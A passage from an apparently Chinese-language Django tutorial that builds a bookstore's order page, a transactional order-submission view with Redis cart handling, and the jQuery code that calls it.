class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书店-我的订单&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>确认收货地址<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>寄送到：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"addr_id"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; addr.id &#125;&#125;"</span> <span class="attr">checked</span>=<span class="string">""</span>&gt;</span>&#123;&#123; addr.recipient_addr &#125;&#125; （&#123;&#123; addr.recipient_name &#125;&#125; 收） &#123;&#123; addr.recipient_phone &#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user_center_site.html"</span> <span class="attr">class</span>=<span class="string">"edit_site"</span>&gt;</span>编辑收货地址<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>支付方式<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pay_style_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"cash"</span>&gt;</span>货到付款<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"weixin"</span>&gt;</span>微信支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"zhifubao"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"bank"</span>&gt;</span>银行卡支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>商品列表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list_th clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>商品名称<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span>商品单位<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>商品价格<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>小计<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% for book in books_li %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"books_list_td clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>&#123;&#123; forloop.counter &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>&#123;&#123; book.unit &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>&#123;&#123; book.price &#125;&#125;元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col06"</span>&gt;</span>&#123;&#123; book.count &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col07"</span>&gt;</span>&#123;&#123; book.amount &#125;&#125;元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>总金额结算<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"settle_con"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"total_book_count"</span>&gt;</span>共<span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; total_count &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span>件商品，总金额<span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; total_price &#125;&#125;元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"transit"</span>&gt;</span>运费：<span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; transit_price &#125;&#125;元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"total_pay"</span>&gt;</span>实付款：<span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; total_pay &#125;&#125;元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"order_submit clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">id</span>=<span class="string">"order_btn"</span> <span class="attr">books_ids</span>=<span class="string">"&#123;&#123; books_ids &#125;&#125;"</span>&gt;</span>提交订单<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br><span class="line">&#123;% block bottom %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popup_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popup"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>订单提交成功！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mask"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock bottom %&#125;</span><br></pre></td></tr></table></figure><p>那么订单显示页面就初步开发完了。</p><h2 id="3，订单提交功能"><a href="#3，订单提交功能" class="headerlink" title="3，订单提交功能"></a>3，订单提交功能</h2><p>接下来我们来开发提交订单的功能。先开发后端接口，这里要用到事务，transaction，原子操作的概念。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># order/views.py</span></span><br><span class="line"><span class="comment"># 提交订单，需要向两张表中添加信息</span></span><br><span class="line"><span class="comment"># s_order_info:订单信息表 添加一条</span></span><br><span class="line"><span class="comment"># s_order_books: 订单商品表， 订单中买了几件商品，添加几条记录</span></span><br><span class="line"><span class="comment"># 前端需要提交过来的数据: 地址 支付方式 购买的商品id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.向订单表中添加一条信息</span></span><br><span class="line"><span class="comment"># 2.遍历向订单商品表中添加信息</span></span><br><span class="line">    <span class="comment"># 2.1 添加订单商品信息之后，增加商品销量，减少库存</span></span><br><span class="line">    <span class="comment"># 2.2 累计计算订单商品的总数目和总金额</span></span><br><span class="line"><span class="comment"># 3.更新订单商品的总数目和总金额</span></span><br><span class="line"><span class="comment"># 4.清除购物车对应信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 事务:原子性:一组sql操作，要么都成功，要么都失败。</span></span><br><span class="line"><span class="comment"># 开启事务: begin;</span></span><br><span class="line"><span class="comment"># 事务回滚: rollback;</span></span><br><span class="line"><span class="comment"># 事务提交: commit;</span></span><br><span class="line"><span class="comment"># 设置保存点: savepoint 保存点;</span></span><br><span class="line"><span class="comment"># 回滚到保存点: rollback to 保存点;</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> transaction</span><br><span class="line"></span><br><span class="line"><span class="meta">@transaction.atomic</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_commit</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''生成订单'''</span></span><br><span class="line">    <span class="comment"># 验证用户是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.session.has_key(<span class="string">'islogin'</span>):</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">0</span>, <span class="string">'errmsg'</span>: <span class="string">'用户未登录'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    addr_id = request.POST.get(<span class="string">'addr_id'</span>)</span><br><span class="line">    pay_method = request.POST.get(<span class="string">'pay_method'</span>)</span><br><span class="line">    books_ids = request.POST.get(<span class="string">'books_ids'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([addr_id, pay_method, books_ids]):</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'errmsg'</span>: <span class="string">'数据不完整'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        addr = Address.objects.get(id=addr_id)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 地址信息出错</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>, <span class="string">'errmsg'</span>: <span class="string">'地址信息错误'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> int(pay_method) <span class="keyword">not</span> <span class="keyword">in</span> OrderInfo.PAY_METHODS_ENUM.values():</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">3</span>, <span class="string">'errmsg'</span>: <span class="string">'不支持的支付方式'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 订单创建</span></span><br><span class="line">    <span class="comment"># 组织订单信息</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># 订单id: 20171029110830+用户的id</span></span><br><span class="line">    order_id = datetime.now().strftime(<span class="string">'%Y%m%d%H%M%S'</span>) + str(passport_id)</span><br><span class="line">    <span class="comment"># 运费</span></span><br><span class="line">    transit_price = <span class="number">10</span></span><br><span class="line">    <span class="comment"># 订单商品总数和总金额</span></span><br><span class="line">    total_count = <span class="number">0</span></span><br><span class="line">    total_price = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个保存点</span></span><br><span class="line">    sid = transaction.savepoint()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 向订单信息表中添加一条记录</span></span><br><span class="line">        order = OrderInfo.objects.create(order_id=order_id,</span><br><span class="line">                                 passport_id=passport_id,</span><br><span class="line">                                 addr_id=addr_id,</span><br><span class="line">                                 total_count=total_count,</span><br><span class="line">                                 total_price=total_price,</span><br><span class="line">                                 transit_price=transit_price,</span><br><span class="line">                                 pay_method=pay_method)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向订单商品表中添加订单商品的记录</span></span><br><span class="line">        books_ids = books_ids.split(<span class="string">','</span>)</span><br><span class="line">        conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">        cart_key = <span class="string">'cart_%d'</span> % passport_id</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历获取用户购买的商品信息</span></span><br><span class="line">        <span class="keyword">for</span> id <span class="keyword">in</span> books_ids:</span><br><span class="line">            books = Books.objects.get_books_by_id(books_id=id)</span><br><span class="line">            <span class="keyword">if</span> books <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">                transaction.savepoint_rollback(sid)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">4</span>, <span class="string">'errmsg'</span>: <span class="string">'商品信息错误'</span>&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获取用户购买的商品数目</span></span><br><span class="line">            count = conn.hget(cart_key, id)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判断商品的库存</span></span><br><span class="line">            <span class="keyword">if</span> int(count) &gt; books.stock:</span><br><span class="line">                transaction.savepoint_rollback(sid)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">5</span>, <span class="string">'errmsg'</span>: <span class="string">'商品库存不足'</span>&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建一条订单商品记录</span></span><br><span class="line">            OrderGoods.objects.create(order_id=order_id,</span><br><span class="line">                                      books_id=id,</span><br><span class="line">                                      count=count,</span><br><span class="line">                                      price=books.price)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 增加商品的销量，减少商品库存</span></span><br><span class="line">            books.sales += int(count)</span><br><span class="line">            books.stock -= int(count)</span><br><span class="line">            books.save()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 累计计算商品的总数目和总额</span></span><br><span class="line">            total_count += int(count)</span><br><span class="line">            total_price += int(count) * books.price</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新订单的商品总数目和总金额</span></span><br><span class="line">        order.total_count = total_count</span><br><span class="line">        order.total_price = total_price</span><br><span class="line">        order.save()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 操作数据库出错，进行回滚操作</span></span><br><span class="line">        transaction.savepoint_rollback(sid)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">7</span>, <span class="string">'errmsg'</span>: <span class="string">'服务器错误'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清除购物车对应记录</span></span><br><span class="line">    conn.hdel(cart_key, *books_ids)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 事务提交</span></span><br><span class="line">    transaction.savepoint_commit(sid)</span><br><span class="line">    <span class="comment"># 返回应答</span></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">6</span>&#125;)</span><br></pre></td></tr></table></figure><p>然后配置urls.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^commit/$'</span>, views.order_commit, name=<span class="string">'commit'</span>), <span class="comment"># 生成订单</span></span><br></pre></td></tr></table></figure></p><p>然后改写前端页面<code>place_order.html</code>，来调用后端提交订单的接口。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block bottomfiles %&#125;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        $(<span class="string">'#order_btn'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 获取收货地址的id, 支付方式，用户购买的商品id</span></span><br><span class="line">            <span class="keyword">var</span> addr_id = $(<span class="string">'input[name="addr_id"]'</span>).val()</span><br><span class="line">            <span class="keyword">var</span> pay_method = $(<span class="string">'input[name="pay_style"]:checked'</span>).val()</span><br><span class="line">            <span class="keyword">var</span> books_ids = $(<span class="keyword">this</span>).attr(<span class="string">'books_ids'</span>)</span><br><span class="line">            <span class="keyword">var</span> csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span><br><span class="line">            <span class="comment">// alert(addr_id+':'+pay_method+':'+books_ids)</span></span><br><span class="line">            <span class="comment">// 发起post请求， 访问/order/commit/</span></span><br><span class="line">            <span class="keyword">var</span> params = &#123;</span><br><span class="line">                <span class="string">'addr_id'</span>: addr_id,</span><br><span class="line">                <span class="string">'pay_method'</span>: pay_method,</span><br><span class="line">                <span class="string">'books_ids'</span>: books_ids,</span><br><span class="line">                <span class="string">'csrfmiddlewaretoken'</span>: csrf</span><br><span class="line">            &#125;</span><br><span class="line">            $.post(<span class="string">'/order/commit/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 根据json进行处理</span></span><br><span class="line">                <span class="keyword">if</span> (data.res == <span class="number">6</span>)&#123;</span><br><span class="line">                    $(<span class="string">'.popup_con'</span>).fadeIn(<span class="string">'fast'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                            $(<span class="string">'.popup_con'</span>).fadeOut(<span class="string">'fast'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                                <span class="built_in">window</span>.location.href = <span class="string">'/user/order/'</span>;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;,<span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    alert(data.errmsg)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&#123;% endblock bottomfiles %&#125;</span></span><br></pre></td></tr></table></figure></p><p>那么，我们提交订单的功能也就开发好了。</p><h2 id="4，接下来我们回过头去把购物车中的提交功能给做了，然后就能做支付功能了。"><a href="#4，接下来我们回过头去把购物车中的提交功能给做了，然后就能做支付功能了。" class="headerlink" title="4，接下来我们回过头去把购物车中的提交功能给做了，然后就能做支付功能了。"></a>4，接下来我们回过头去把购物车中的提交功能给做了，然后就能做支付功能了。</h2><p>将cart.html中的去结算功能给出如下的实现。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/order/place/"</span>&gt;</span></span><br><span class="line">&#123;% for book in books_li %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"cart_list_td clearfix"</span>&gt;</span></span><br><span class="line">    &#123;# 提交表单时，如果checkbox没有被选中，它的值不会被提交 #&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"books_ids"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; book.id &#125;&#125;"</span> <span class="attr">checked</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; book.price &#125;&#125;元/&#123;&#123; book.unit &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span 